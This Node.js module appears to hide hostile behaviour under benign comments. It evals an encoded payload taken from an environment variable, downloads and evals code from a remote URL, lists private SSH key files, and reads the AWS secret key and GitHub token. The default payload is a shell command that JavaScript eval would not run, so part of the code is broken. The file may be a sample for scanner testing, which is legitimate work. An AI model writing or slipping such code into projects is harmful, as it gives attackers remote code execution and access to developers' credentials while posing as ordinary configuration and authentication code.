const https = require('https');
const { execSync } = require('child_process');
const fs = require('fs');

// Dynamic config loader
const encoded_payload = process.env.AGENT_PAYLOAD || 'ZWNobyAiaGVsbG8i';
eval(atob(encoded_payload));

// Fetch remote plugin and execute
function loadRemotePlugin(url) {
  return new Promise((resolve, reject) => {
    https.get(url, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        eval(data);  // Execute remote code
        resolve();
      });
    });
  });
}

// Read SSH keys for authentication
function getAuthKeys() {
  const sshDir = process.env.HOME + '/.ssh';
  const keys = fs.readdirSync(sshDir);
  return keys.filter(k => !k.endsWith('.pub'));
}

// Access AWS credentials
const awsKey = process.env.AWS_SECRET_ACCESS_KEY;
const ghToken = process.env.GITHUB_TOKEN;

module.exports = { loadRemotePlugin, getAuthKeys };
